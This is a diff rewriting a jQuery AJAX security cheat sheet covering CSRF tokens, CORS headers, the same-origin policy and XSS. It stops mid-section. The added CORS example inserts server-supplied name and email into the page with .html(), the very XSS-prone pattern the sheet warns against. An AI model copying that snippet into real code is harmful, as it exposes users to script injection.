@@ -1,4 +1,4 @@
-# AJAX and Security: A Comprehensive Programming Cheat Sheet
+# jQuery AJAX Security — Comprehensive Programming Cheat Sheet
 
 ---
 
@@ -6,828 +6,1115 @@
 
 ### Definitions
 
-**Core Definition**
-AJAX security encompasses the browser-enforced policies, server-side configurations, and client-side techniques that protect asynchronous HTTP requests from cross-origin attacks, request forgery, and credential theft.
+**Core Definition:**
+jQuery AJAX Security encompasses the principles, techniques, and best practices for protecting web applications from vulnerabilities that arise when making asynchronous HTTP requests using jQuery, including Cross-Site Request Forgery (CSRF), Cross-Origin Resource Sharing (CORS), Cross-Site Scripting (XSS), JSONP injection, insecure transport, and improper authentication/authorization.
 
-**Technical Definition**
-AJAX security operates across multiple layers: the browser's Same-Origin Policy (SOP) restricts which origins can read responses from which resources ; Cross-Origin Resource Sharing (CORS) provides a controlled mechanism for relaxing SOP for trusted origins ; Cross-Site Request Forgery (CSRF) mitigation prevents attackers from making authenticated requests on behalf of users ; and authentication mechanisms like JWT Bearer tokens ensure requests carry verifiable identity credentials . Critically, all client-side security controls are bypassable, making server-side validation and authorization mandatory .
+**Technical Definition:**
+jQuery AJAX Security involves mitigating attack vectors introduced by client-side asynchronous communication. These include CSRF (where an attacker tricks a logged-in user's browser into sending an unauthorized request), CORS misconfiguration (which can expose resources to untrusted origins), DOM-based XSS (where untrusted data is inserted into the DOM via methods like `.html()`), JSONP callback injection (where unvalidated callback parameters execute arbitrary JavaScript), mixed content (where HTTP resources are loaded on HTTPS pages), and insecure handling of authentication tokens. The OWASP Foundation provides comprehensive guidelines for AJAX security, emphasizing that services can be called directly by users and that client-side validation alone is insufficient.
 
-**Beginner-Friendly Explanation**
-When your JavaScript talks to a server, the browser has built-in safety rules. It won't let a random website read your bank's data, and it won't let a malicious site trick you into making requests you didn't intend. AJAX security is about understanding these rules and adding your own layers (like tokens) to keep communications safe.
+**Beginner-Friendly Explanation:**
+AJAX lets your web page talk to a server in the background. But just like any conversation, there are people who might try to eavesdrop or pretend to be someone else. AJAX Security is about making sure your data stays private, your requests are genuine, and malicious code can't sneak in through the data you receive. This cheat sheet explains the main threats and how to protect against them.
 
 ### Key Characteristics
 
-- **Browser-Enforced**: SOP and CORS are enforced by the browser, not by JavaScript .
-- **Origin-Based**: Security boundaries are defined by protocol + host + port (the "origin") .
-- **Token-Based Auth**: Modern APIs use Bearer tokens (JWT) for stateless authentication .
-- **Defense in Depth**: Client-side protections augment but never replace server-side validation .
+- **Client-Side Trust Boundary:** AJAX code runs in the browser, which is an untrusted environment. Server-side validation is mandatory; client-side checks can be bypassed.
+- **Same-Origin Policy:** Browsers restrict AJAX requests to the same origin by default. CORS is the standard mechanism for controlled cross-origin access.
+- **Token-Based CSRF Protection:** CSRF tokens must be included in AJAX request headers for state-changing operations (POST, PUT, DELETE, PATCH).
+- **Output Encoding:** Using `.text()` instead of `.html()` for untrusted data prevents XSS by escaping HTML entities.
+- **JSONP Risks:** JSONP uses script injection and is inherently insecure unless the callback parameter is strictly validated against a legal function name pattern.
+- **Transport Security:** All AJAX requests should use HTTPS to prevent man-in-the-middle attacks and data leakage.
+- **Version Sensitivity:** Older jQuery versions (pre-3.0) have known XSS vulnerabilities (CVE-2015-9251, CVE-2019-11358) that have been patched in modern releases.
 
 ### Prerequisites
 
-- Basic understanding of HTTP (methods, headers, status codes).
-- Familiarity with `$.ajax()` and its configuration options.
-- Knowledge of JavaScript and the DOM.
+- Basic knowledge of HTML, JavaScript, and the DOM
+- Familiarity with jQuery AJAX methods (`$.ajax()`, `$.get()`, `$.post()`)
+- Understanding of HTTP methods (GET, POST, PUT, DELETE) and status codes
+- Basic knowledge of cookies and session management
+- Experience with browser developer tools (Network panel, Console)
 
 ### Related Programming Areas
 
-- **Web Application Security**: OWASP Top 10, XSS, CSRF, CORS misconfigurations.
-- **OAuth 2.0 / OpenID Connect**: Modern authentication protocols.
-- **API Design**: RESTful principles and stateless authentication.
+- **Web Security (OWASP Top 10):** AJAX security intersects with CSRF, XSS, and broken access control.
+- **HTTP Protocol:** Headers like `Content-Type`, `Access-Control-Allow-Origin`, and `Authorization` are central to AJAX security.
+- **Content Security Policy (CSP):** CSP headers restrict script sources and mitigate XSS and JSONP risks.
+- **Cross-Origin Resource Sharing (CORS):** The W3C standard that enables controlled cross-origin AJAX.
+- **Authentication and Authorization:** AJAX requests must carry valid credentials and enforce server-side authorization.
+- **Transport Layer Security (TLS/HTTPS):** Encrypts AJAX traffic and prevents eavesdropping.
 
 ### Core Concepts / Features
 
-1. Same-Origin Policy (SOP) Boundaries
-2. Cross-Origin Resource Sharing (CORS)
-3. Cross-Site Request Forgery (CSRF) Mitigation
-4. Authentication Mechanisms (JWT Bearer Tokens)
-5. Why Client-Side Handling Never Replaces Server-Side Validation
+1. CSRF (Cross-Site Request Forgery)
+2. CORS (Cross-Origin Resource Sharing)
+3. XSS (Cross-Site Scripting)
+4. JSONP Security
+5. HTTPS
+6. Authentication
+7. Authorization
+8. AJAX Security Best Practices
 
 ---
 
-## Core Concept 1: Same-Origin Policy (SOP) Boundaries
+## 1. CSRF (Cross-Site Request Forgery)
 
 ### Definitions
 
-**Core Definition**
-The Same-Origin Policy is a browser security mechanism that restricts how a document or script loaded from one origin can interact with resources from another origin.
+**Core Definition:**
+CSRF (Cross-Site Request Forgery) is an attack that tricks an authenticated user's browser into sending an unauthorized state-changing request to a web application in which the user is currently authenticated.
 
-**Technical Definition**
-An origin is defined by the combination of scheme (protocol), host, and port . Two URLs are considered same-origin if and only if all three components match exactly. The SOP blocks cross-origin read access: JavaScript from `http://a.com` cannot read the response of a request made to `http://b.com` . The policy applies to `XMLHttpRequest`, `fetch()`, and other APIs that expose response data to JavaScript. Notably, the SOP does not block cross-origin embedding (e.g., `<img>`, `<script>`, `<iframe>`) but blocks reading the contents of those embedded resources .
+**Technical Definition:**
+CSRF exploits the browser's automatic inclusion of cookies (including session cookies) with every request to a given origin. An attacker crafts a malicious page that triggers a request to a vulnerable application (e.g., a form submission or image load). Because the browser automatically attaches the user's session cookie, the application processes the request as if it were legitimate. Protection requires a server-generated, unpredictable token that is included in every state-changing request and validated server-side.
 
-**Beginner-Friendly Explanation**
-The browser treats each website as a separate "room." JavaScript in room A can look at things in room A, but it cannot peek at what's inside room B. It can put a picture frame on the wall showing a picture from room B, but it can't read the pixels of that picture.
-
-### Purposes
-
-- To prevent malicious scripts from reading sensitive data from other origins.
-- To isolate cookies and authentication state by origin.
-- To limit the blast radius of cross-site scripting (XSS) vulnerabilities.
-
-### Syntax Rules and Structure
-
-**Origin Definition**
-
-| Component | Example | Match Required |
-|---|---|---|
-| Scheme | `https://` | Yes |
-| Host | `example.com` | Yes |
-| Port | `:443` (implicit) | Yes |
-
-**Cross-Origin Examples**
-
-| URL A | URL B | Same Origin? |
-|---|---|---|
-| `http://example.com/foo` | `http://example.com/bar` | ✅ Yes |
-| `http://example.com` | `https://example.com` | ❌ No (scheme differs) |
-| `http://example.com` | `http://www.example.com` | ❌ No (host differs) |
-| `http://example.com:80` | `http://example.com:8080` | ❌ No (port differs) |
-
-**Syntax Rules**
-
-1. The SOP applies to `XMLHttpRequest` and `fetch()` response reading .
-2. Cross-origin embedding of images, scripts, and stylesheets is generally allowed .
-3. Cookies are sent to the target origin regardless of the requesting page's origin, but the SOP prevents JavaScript from reading cross-origin responses .
-4. The `document.domain` property can be used to relax SOP for subdomains, but this is deprecated and discouraged.
-
-**Constraints and Limitations**
-
-- **Not a Security Boundary for Forms**: The SOP does not prevent forms from submitting to other origins.
-- **Not a CSRF Defense**: The SOP allows cross-origin requests to be sent; it only blocks reading responses. CSRF exploits this gap.
-- **Subdomain Risks**: Sharing a registrable domain (e.g., `app.example.com` and `user.example.com`) creates implicit trust relationships .
-
-### Multiple Annotated Complete Code Examples
-
-**Example 1: Demonstrating SOP Blocking**
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>SOP — Blocked Cross-Origin Read</title>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-</head>
-<body>
-  <button id="tryCrossOrigin">Try Cross-Origin Read</button>
-  <div id="output"></div>
-
-  <script>
-    $(function () {
-      $("#tryCrossOrigin").on("click", function () {
-        // Attempt to read from a different origin
-        // If this page is served from http://localhost,
-        // the browser will block reading the response from example.com
-        $.get("https://example.com")
-          .done(function (data) {
-            $("#output").text("Received: " + data.substring(0, 100));
-          })
-          .fail(function (jqXHR, textStatus, errorThrown) {
-            // This will fire for cross-origin requests without CORS
-            $("#output").text("Blocked by SOP or CORS: " + textStatus);
-            console.log("Error:", errorThrown);
-          });
-      });
-    });
-  </script>
-</body>
-</html>
-```
-
-**Expected Output**
-- If the page is not served from `https://example.com`, the request is blocked.
-- Console shows a CORS error (e.g., "No 'Access-Control-Allow-Origin' header is present").
-- The `.fail()` handler fires with `textStatus: "error"`.
-
-**Why This Output Occurs**
-The browser sends the request but blocks JavaScript from reading the response because the target origin differs from the page's origin .
-
-### Real-World Cases
-
-- **Mashups**: A weather app on `weather.example.com` cannot read data from `api.otherweather.com` without CORS.
-- **Third-Party Analytics**: Scripts loaded from CDNs can execute but cannot read the host page's DOM (unless granted access).
-- **Iframe Isolation**: A payment form in an iframe from `payments.example.com` cannot be read by the parent page.
-
-### References
-
-- MDN Web Docs — Same-origin policy – https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy
-- web.dev — Same-origin policy – https://web.dev/articles/same-origin-policy
-- WHATWG HTML Standard — Origins – https://html.spec.whatwg.org/multipage/browsers.html#origins
-
----
-
-## Core Concept 2: Cross-Origin Resource Sharing (CORS)
-
-### Definitions
-
-**Core Definition**
-CORS is a browser mechanism that allows a server to explicitly grant permission for JavaScript from another origin to read its responses.
-
-**Technical Definition**
-CORS works through HTTP response headers. For "simple" requests (GET/HEAD/POST with safelisted headers and content types), the browser sends the request and checks for `Access-Control-Allow-Origin` in the response . For "non-simple" requests (custom headers, methods other than GET/HEAD/POST, or non-safelisted content types), the browser first sends a **preflight** `OPTIONS` request to verify the server allows the actual request . The server responds to the preflight with `Access-Control-Allow-Origin`, `Access-Control-Allow-Methods`, and `Access-Control-Allow-Headers` .
-
-**Beginner-Friendly Explanation**
-CORS is like a guest list at a party. By default, the browser says "no one from outside this website can read the data." CORS lets the server say "actually, these specific other websites are allowed." For complex requests, the browser asks the server "is this allowed?" before sending the actual data.
+**Beginner-Friendly Explanation:**
+Imagine you're logged into your bank's website. A malicious website could secretly make your browser send a request to your bank to transfer money. Because you're already logged in, the bank might process it. CSRF protection uses a secret code (token) that only your bank's website knows, so malicious sites can't forge requests.
 
 ### Purposes
 
-- To enable controlled cross-origin API access.
-- To protect users from malicious cross-origin data theft.
-- To allow legitimate third-party integrations (e.g., embedding a payment widget).
-- To support modern web architectures (SPAs on different domains than APIs).
+- To prevent unauthorized state-changing operations from being executed on behalf of an authenticated user.
+- To ensure that requests originate from the application's own pages, not from malicious third-party sites.
+- To protect sensitive actions such as password changes, fund transfers, and data deletion.
 
 ### Syntax Rules and Structure
 
-**Complete CORS Headers**
-
-**Server Response Headers:**
-
-| Header | Purpose | Example |
-|---|---|---|
-| `Access-Control-Allow-Origin` | Which origins can read the response | `https://app.example.com` |
-| `Access-Control-Allow-Methods` | Which HTTP methods are allowed | `GET, POST, PUT, DELETE` |
-| `Access-Control-Allow-Headers` | Which request headers are allowed | `Authorization, Content-Type` |
-| `Access-Control-Allow-Credentials` | Whether cookies can be sent | `true` |
-| `Access-Control-Max-Age` | How long preflight results are cached | `86400` |
-
-**Preflight Request Headers:**
-
-| Header | Purpose |
-|---|---|
-| `Origin` | The requesting origin |
-| `Access-Control-Request-Method` | The method of the actual request |
-| `Access-Control-Request-Headers` | Headers the actual request will use  |
-
-**Syntax Rules**
-
-1. **Simple Requests** bypass preflight: GET, HEAD, or POST with only CORS-safelisted headers and `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain` content types .
-2. **Non-Simple Requests** trigger preflight: custom headers (like `Authorization`), methods like PUT/DELETE, or `application/json` content type .
-3. `Access-Control-Allow-Origin` cannot use the `*` wildcard with `Access-Control-Allow-Credentials: true` .
-4. The `Authorization` header must always be listed explicitly in `Access-Control-Allow-Headers`; wildcards do not apply to it .
-5. For credentialed requests (cookies), the origin must be specified exactly, not wildcarded.
-
-**Constraints and Limitations**
-
-- **Server-Controlled**: Most CORS errors can only be fixed server-side .
-- **Preflight Caching**: Preflight results can be cached, but failures are not retried on the same connection .
-- **No Client-Side Workaround**: JavaScript cannot bypass CORS if the server does not allow it.
-
-### Multiple Annotated Complete Code Examples
-
-**Example 1: Simple Request (No Preflight)**
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS — Simple Request</title>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-</head>
-<body>
-  <button id="simpleReq">Send Simple GET</button>
-  <div id="output"></div>
-
-  <script>
-    $(function () {
-      $("#simpleReq").on("click", function () {
-        // Simple request: GET with no custom headers
-        // No preflight is triggered
-        $.ajax({
-          url: "https://api.example.com/data",
-          type: "GET",
-          dataType: "json"
-        })
-        .done(function (data) {
-          $("#output").text("Success: " + JSON.stringify(data));
-        })
-        .fail(function (jqXHR, textStatus, errorThrown) {
-          $("#output").text("CORS blocked or error: " + errorThrown);
-        });
-      });
-    });
-  </script>
-</body>
-</html>
-```
-
-**Expected Output**
-- The browser sends a simple GET request.
-- If the server responds with `Access-Control-Allow-Origin: *` or the page's origin, the response is readable.
-- If not, the `.fail()` handler fires with a CORS error.
-
-**Why This Output Occurs**
-Simple requests do not trigger preflight. The browser checks the `Access-Control-Allow-Origin` header on the response directly .
-
----
-
-**Example 2: Non-Simple Request (Preflight Triggered)**
-
-```html
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <title>CORS — Preflight</title>
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
-</head>
-<body>
-  <button id="preflightReq">Send Request with Auth Header</button>
-  <div id="output"></div>
-
-  <script>
-    $(function () {
-      $("#preflightReq").on("click", function () {
-        // Non-simple request: custom Authorization header
-        // This triggers a preflight OPTIONS request
-        $.ajax({
-          url: "https://api.example.com/protected",
-          type: "GET",
-          headers: {
-            "Authorization": "Bearer " + "your-token-here"
-          },
-          dataType: "json"
-        })
-        .done(function (data) {
-          $("#output").text("Success: " + JSON.stringify(data));
-        })
-        .fail(function (jqXHR, textStatus, errorThrown) {
-          $("#output").text("Preflight or request failed: " + errorThrown);
-          console.log("Status:", jqXHR.status);
-        });
-      });
-    });
-  </script>
-</body>
-</html>
-```
-
-**Expected Output**
-- The browser sends an OPTIONS preflight request with `Access-Control-Request-Headers: authorization`.
-- If the server responds with `Access-Control-Allow-Headers: authorization`, the actual GET proceeds.
-- If not, the request fails with a CORS error.
-
-**Why This Output Occurs**
-The `Authorization` header is not CORS-safelisted, triggering a preflight. The server must explicitly allow it .
-
-### Real-World Cases
-
-- **API Gateways**: Configuring CORS on AWS API Gateway, Nginx, or Express.js.
-- **Microservices**: Allowing a frontend at `app.example.com` to call APIs at `api.example.com`.
-- **Third-Party Widgets**: Allowing embedding sites to read data from a service's API.
-
-### References
-
-- MDN Web Docs — CORS Guide – https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS
-- MDN Web Docs — Access-Control-Allow-Headers – https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Allow-Headers
-- MDN Web Docs — Access-Control-Request-Headers – https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Access-Control-Request-Headers
-- MDN Web Docs — CORS Preflight Errors – https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS/Errors/CORSPreflightDidNotSucceed
-
----
-
-## Core Concept 3: Cross-Site Request Forgery (CSRF) Mitigation
-
-### Definitions
-
-**Core Definition**
-CSRF is an attack that tricks a user's browser into making an authenticated request to a vulnerable application without the user's knowledge or consent.
-
-**Technical Definition**
-CSRF exploits the fact that browsers automatically attach cookies to requests based on the target domain, regardless of the originating page . If a user is authenticated to `bank.com` via a session cookie, a malicious page can submit a form or send a request to `bank.com` that includes that cookie, causing the bank to execute an action the user did not intend . Mitigation involves synchronizer tokens: the server generates a random token tied to the user's session, embeds it in the page, and requires it in a custom header (e.g., `X-CSRF-Token`) for state-changing requests .
-
-**Beginner-Friendly Explanation**
-Imagine someone forges your signature on a check. Your bank sees your signature (the cookie) and thinks it's really you. CSRF protection is like adding a secret code to each check that only you and the bank know — the forger can't reproduce it.
-
-### Purposes
-
-- To prevent attackers from performing authenticated actions on behalf of users.
-- To protect state-changing operations (POST, PUT, DELETE).
-- To complement cookie-based authentication.
-- To comply with security standards (OWASP, PCI DSS).
-
-### Syntax Rules and Structure
-
-**Complete General Syntax**
+**Complete General Syntax (jQuery CSRF Token Setup):**
 
 ```javascript
-// Server embeds CSRF token in the page (e.g., in a meta tag)
-// <meta name="csrf-token" content="abc123...">
+// Step 1: Include the CSRF token in a meta tag
+// <meta name="csrf-token" content="{{ csrf_token() }}">
 
-// jQuery AJAX includes the token in a custom header
+// Step 2: Configure jQuery to include the token in all AJAX requests
+var csrf_token = $('meta[name="csrf-token"]').attr('content');
+
 $.ajaxSetup({
-  headers: {
-    "X-CSRF-Token": $("meta[name='csrf-token']").attr("content")
-  }
+    beforeSend: function(xhr, settings) {
+        if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
+            xhr.setRequestHeader("X-CSRF-Token", csrf_token);
+        }
+    }
+});
+
+// Step 3: Define which methods are CSRF-safe (do not need token)
+function csrfSafeMethod(method) {
+    return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
+}
+```
+
+**Component Breakdown:**
+
+| Component | Description |
+|-----------|-------------|
+| `csrf_token` | A server-generated, unpredictable token tied to the user's session. |
+| `$.ajaxSetup()` | Global configuration for all AJAX requests. |
+| `beforeSend` | Callback that runs before each request is sent. |
+| `csrfSafeMethod()` | Determines if the HTTP method is safe (GET, HEAD, OPTIONS, TRACE). |
+| `X-CSRF-Token` | Custom header name (varies by framework; Django uses `X-CSRFToken`). |
+
+**Syntax Rules:**
+
+1. The CSRF token must be generated server-side and tied to the user's session.
+2. The token must be included in all state-changing requests (POST, PUT, DELETE, PATCH).
+3. The token must be validated server-side; client-side inclusion alone is insufficient.
+4. GET, HEAD, OPTIONS, and TRACE requests are considered "safe" and do not require CSRF tokens.
+5. The token can be delivered via a meta tag, a cookie, or a JavaScript variable.
+
+**Constraints and Limitations:**
+
+- CSRF tokens must be unique per session and unpredictable.
+- Cross-domain requests should not include CSRF tokens (the `!this.crossDomain` check).
+- The token header name varies by framework: `X-CSRF-Token`, `X-CSRFToken`, `X-XSRF-TOKEN`.
+- CSRF protection is only effective if the server validates the token.
+
+### Multiple Annotated Complete Step by Step Code Examples
+
+**Example 1: Complete CSRF Protection Setup**
+
+```html
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Protection with jQuery</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <!-- Step 1: Server injects the CSRF token into a meta tag -->
+    <meta name="csrf-token" content="abc123def456ghi789">
+</head>
+<body>
+    <form id="myForm">
+        <input type="text" name="username" placeholder="Username">
+        <button type="submit">Submit</button>
+    </form>
+    <div id="result"></div>
+
+    <script>
+        // Step 2: Retrieve the CSRF token from the meta tag
+        var csrfToken = $('meta[name="csrf-token"]').attr('content');
+
+        // Step 3: Configure jQuery to include the token in unsafe requests
+        $.ajaxSetup({
+            beforeSend: function(xhr, settings) {
+                if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
+                    xhr.setRequestHeader("X-CSRF-Token", csrfToken);
+                }
+            }
+        });
+
+        // Step 4: Define safe methods
+        function csrfSafeMethod(method) {
+            return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
+        }
+
+        // Step 5: Handle form submission via AJAX
+        $("#myForm").on("submit", function(event) {
+            event.preventDefault();
+            $.ajax({
+                url: "/api/submit",
+                type: "POST",
+                data: $(this).serialize(),
+                success: function(response) {
+                    $("#result").text("Submitted successfully!");
+                },
+                error: function(jqXHR) {
+                    $("#result").text("Error: " + jqXHR.status);
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+```
+
+**Expected Output:**
+When the form is submitted, the AJAX request includes the `X-CSRF-Token` header with the value `abc123def456ghi789`. The server validates the token and processes the request.
+
+**Why This Code Produces That Result:**
+The `$.ajaxSetup()` configuration ensures that all non-safe requests (POST, PUT, DELETE, PATCH) automatically include the CSRF token in the `X-CSRF-Token` header. The `csrfSafeMethod()` function excludes GET, HEAD, OPTIONS, and TRACE requests. The `!this.crossDomain` check prevents sending the token to external domains. The server validates the token against the session-stored value.
+
+### Real-World Cases
+
+- **Form Submissions:** Protecting login, registration, and profile update forms.
+- **State-Changing API Calls:** Protecting POST/PUT/DELETE requests to REST APIs.
+- **Banking and Financial Applications:** Protecting fund transfers and account changes.
+
+---
+
+## 2. CORS (Cross-Origin Resource Sharing)
+
+### Definitions
+
+**Core Definition:**
+CORS (Cross-Origin Resource Sharing) is a W3C specification that allows a server to specify which origins are permitted to access its resources via AJAX, relaxing the browser's same-origin policy in a controlled manner.
+
+**Technical Definition:**
+CORS works by adding specific HTTP response headers (e.g., `Access-Control-Allow-Origin`) that instruct the browser whether to permit a cross-origin request. For simple requests (GET, POST with certain content types), the browser sends the request and checks the response headers. For "preflighted" requests (PUT, DELETE, custom headers), the browser first sends an `OPTIONS` request to check permissions. In jQuery, `xhrFields: { withCredentials: true }` is required to send credentials (cookies, HTTP auth) with cross-origin requests.
+
+**Beginner-Friendly Explanation:**
+Normally, your web page can only talk to the server it came from. CORS is a way for servers to say "it's okay for other websites to talk to me too." The server adds special headers to its responses, and the browser checks these headers before allowing the data through.
+
+### Purposes
+
+- To enable controlled cross-origin AJAX requests without using insecure workarounds like JSONP.
+- To allow APIs to serve data to multiple trusted front-end applications.
+- To provide a secure alternative to the same-origin policy when cross-domain communication is necessary.
+
+### Syntax Rules and Structure
+
+**Complete General Syntax:**
+
+```javascript
+// Client-side: jQuery AJAX with credentials
+$.ajax({
+    type: "GET",
+    url: "https://api.example.com/data",
+    xhrFields: {
+        withCredentials: true
+    },
+    crossDomain: true,
+    success: function(data) { /* ... */ }
 });
 ```
 
-**Component Breakdown**
+**Server-Side Headers (examples):**
 
-- **CSRF Token**: A random, unpredictable value generated server-side per session .
-- **Custom Header**: `X-CSRF-Token` (or similar) sent with AJAX requests.
-- **Server Validation**: Server checks that the header token matches the session's expected token.
+```
+Access-Control-Allow-Origin: https://yourdomain.com
+Access-Control-Allow-Credentials: true
+Access-Control-Allow-Methods: GET, POST, PUT, DELETE
+Access-Control-Allow-Headers: Content-Type, X-CSRF-Token
+```
 
-**Syntax Rules**
+**Component Breakdown:**
 
-1. **State-changing operations** must use POST/PUT/DELETE, never GET .
-2. Tokens must be unpredictable and tied to the user's session.
-3. Tokens should be sent via custom headers for AJAX requests, not cookies .
-4. `SameSite` cookies provide defense-in-depth but do not replace proper CSRF tokens .
-5. For SPAs, store the token in `localStorage` and send it via header .
+| Component | Description |
+|-----------|-------------|
+| `Access-Control-Allow-Origin` | Specifies which origins can access the resource. |
+| `Access-Control-Allow-Credentials` | Indicates whether credentials (cookies) can be sent. |
+| `xhrFields.withCredentials` | jQuery setting to send credentials with cross-origin requests. |
+| `crossDomain: true` | jQuery setting to force a cross-domain request. |
 
-**Constraints and Limitations**
+**Syntax Rules:**
 
-- **No CSRF for Token-Only Auth**: If authentication uses `Authorization` headers (not cookies), CSRF is not a vulnerability .
-- **SameSite Limitations**: SameSite does not protect against client-side CSRF (malicious input causing same-origin requests) .
-- **XSS Overrides CSRF**: If an attacker can execute JavaScript on your page, they can read the CSRF token.
+1. The `Access-Control-Allow-Origin` header must match the requesting origin exactly (or be `*` for public APIs without credentials).
+2. When credentials are included, `Access-Control-Allow-Origin` cannot be `*`; it must be a specific origin.
+3. Preflight `OPTIONS` requests are sent for non-simple requests (custom headers, PUT, DELETE).
+4. The server must respond to preflight requests with appropriate `Access-Control-Allow-Methods` and `Access-Control-Allow-Headers`.
+5. CORS does not protect against CSRF; CSRF tokens are still required for state-changing requests.
 
-### Multiple Annotated Complete Code Examples
+**Constraints and Limitations:**
 
-**Example 1: Reading CSRF Token from Meta Tag**
+- CORS requires server-side configuration; the client cannot enable it alone.
+- Older browsers (IE9 and below) do not support CORS; JSONP or a proxy is required.
+- Wildcard (`*`) origins cannot be used with credentials.
+
+### Multiple Annotated Complete Step by Step Code Examples
+
+**Example 1: jQuery CORS Request with Credentials**
 
 ```html
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>CSRF — Token from Meta</title>
-  <!-- Server-rendered meta tag with CSRF token -->
-  <meta name="csrf-token" content="a1b2c3d4e5f6...">
-  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <title>CORS with jQuery</title>
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
 </head>
 <body>
-  <button id="submitBtn">Submit Form with CSRF</button>
-  <div id="output"></div>
+    <div id="output"></div>
 
-  <script>
-    $(function () {
-      $("#submitBtn").on("click", function () {
-        // Step 1: Read CSRF token from meta tag
-        var csrfToken = $("meta[name='csrf-token']").attr("content");
-
-        // Step 2: Send POST with token in custom header
+    <script>
+        // Step 1: Make a cross-origin request with credentials
         $.ajax({
-          url: "/api/transfer",
-          type: "POST",
-          contentType: "application/json",
-          headers: {
-            "X-CSRF-Token": csrfToken
-          },
-          data: JSON.stringify({
-            from: "account-1",
-            to: "account-2",
-            amount: 100
-          }),
-          dataType: "json"
+            type: "GET",
+            url: "https://api.example.com/user/profile",
+            xhrFields: {
+                withCredentials: true // Send cookies with the request
+            },
+            crossDomain: true, // Explicitly mark as cross-domain
+            dataType: "json"
         })
-        .done(function (response) {
-          $("#output").text("Transfer successful: " + response.transactionId);
+        .done(function(data) {
+            // Step 2: Handle the response
+            $("#output").html(
+                "<h3>" + data.name + "</h3>" +
+                "<p>Email: " + data.email + "</p>"
+            );
         })
-        .fail(function (jqXHR) {
-          if (jqXHR.status === 403) {
-            $("#output").text("CSRF validation failed.");
-          } else {
-            $("#output").text("Error: " + jqXHR.statusText);
-          }
+        .fail(function(jqXHR, textStatus, errorThrown) {
+            // Step 3: Handle CORS errors
+            if (jqXHR.status === 0) {
+                $("#output").text("CORS error: request blocked by browser");
+            } else {
+                $("#output").text("Error: " + textStatus);
+            }
         });
-      });
-    });
-  </script>
+    </script>
 </body>
 </html>
 ```
 
-**Expected Output**
-- Clicking "Submit Form" sends a POST with `X-CSRF-Token` header.
-- The server validates the token against the session.
-- If valid, the transfer succeeds; if not, a 403 error is returned.
+**Expected Output:**
+If the server responds with `Access-Control-Allow-Origin: https://yourdomain.com` and `Access-Control-Allow-Credentials: true`, the profile data is displayed. Otherwise, a CORS error is shown.
 
-**Why This Output Occurs**
-The CSRF token is included in a custom header. The server compares it to the token stored in the user's session .
+**Why This Code Produces That Result:**
+The `xhrFields: { withCredentials: true }` setting tells jQuery to include cookies in the cross-origin request. The browser sends the request with an `Origin` header. The server must respond with the correct CORS headers. If the headers are missing or incorrect, the browser blocks the response and jQuery's `.fail()` handler fires with `jqXHR.status === 0`.
 
 ### Real-World Cases
 
-- **Banking Transfers**: Preventing forged money transfers.
-- **Email Changes**: Preventing attackers from changing account email addresses.
-- **Admin Actions**: Protecting administrative endpoints.
-- **SPA API Calls**: Including CSRF tokens in all state-changing AJAX requests .
-
-### References
-
-- OWASP — Cross-Site Request Forgery Prevention Cheat Sheet – https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
-- Microsoft Learn — Prevent CSRF attacks in ASP.NET Core – https://learn.microsoft.com/en-us/aspnet/core/security/anti-request-forgery
-- Microsoft Learn — CSRF (Chinese) – https://learn.microsoft.com/zh-cn/aspnet/core/security/anti-request-forgery
+- **Microservices Architecture:** Front-end applications calling APIs on different subdomains.
+- **Third-Party API Integration:** Consuming public APIs (e.g., GitHub, Google Maps) from a web application.
+- **Single Sign-On (SSO):** Authenticating users across multiple domains with credential sharing.
 
 ---
 
-## Core Concept 4: Authentication Mechanisms (JWT Bearer Tokens)
+## 3. XSS (Cross-Site Scripting)
 
 ### Definitions
 
-**Core Definition**
-Bearer token authentication is a method where the client sends a verifiable token in the `Authorization` HTTP header to authenticate API requests.
+**Core Definition:**
+XSS (Cross-Site Scripting) is a vulnerability where an attacker injects malicious scripts into web pages viewed by other users, typically by exploiting insufficient output encoding when inserting untrusted data into the DOM.
 
-**Technical Definition**
-A JSON Web Token (JWT) is a compact, URL-safe means of representing claims between two parties. The token consists of three Base64-encoded parts: header, payload, and signature. The client stores the token (in `localStorage`, `sessionStorage`, or memory) and attaches it to every request using the `Authorization: Bearer <token>` header . Unlike cookies, tokens are not automatically sent by the browser, which makes them inherently resistant to CSRF attacks .
+**Technical Definition:**
+In jQuery AJAX contexts, XSS occurs when server responses or user-supplied data are inserted into the DOM using methods that interpret HTML (e.g., `.html()`, `.append()`, `.before()`, `.after()`). If the data contains `<script>` tags or event handlers, the browser executes them. OWASP recommends using `.innerText` (or jQuery's `.text()`) instead of `.innerHtml` (or `.html()`), avoiding `eval()`, `new Function()`, and `$.parseHTML()` with untrusted input, and using CSRF protection.
 
-**Beginner-Friendly Explanation**
-A JWT is like a digital ID card. After you log in, the server gives you this card. Every time you make a request, you show the card by putting it in the `Authorization` header. The server checks the card's signature to make sure it's not forged.
+**Beginner-Friendly Explanation:**
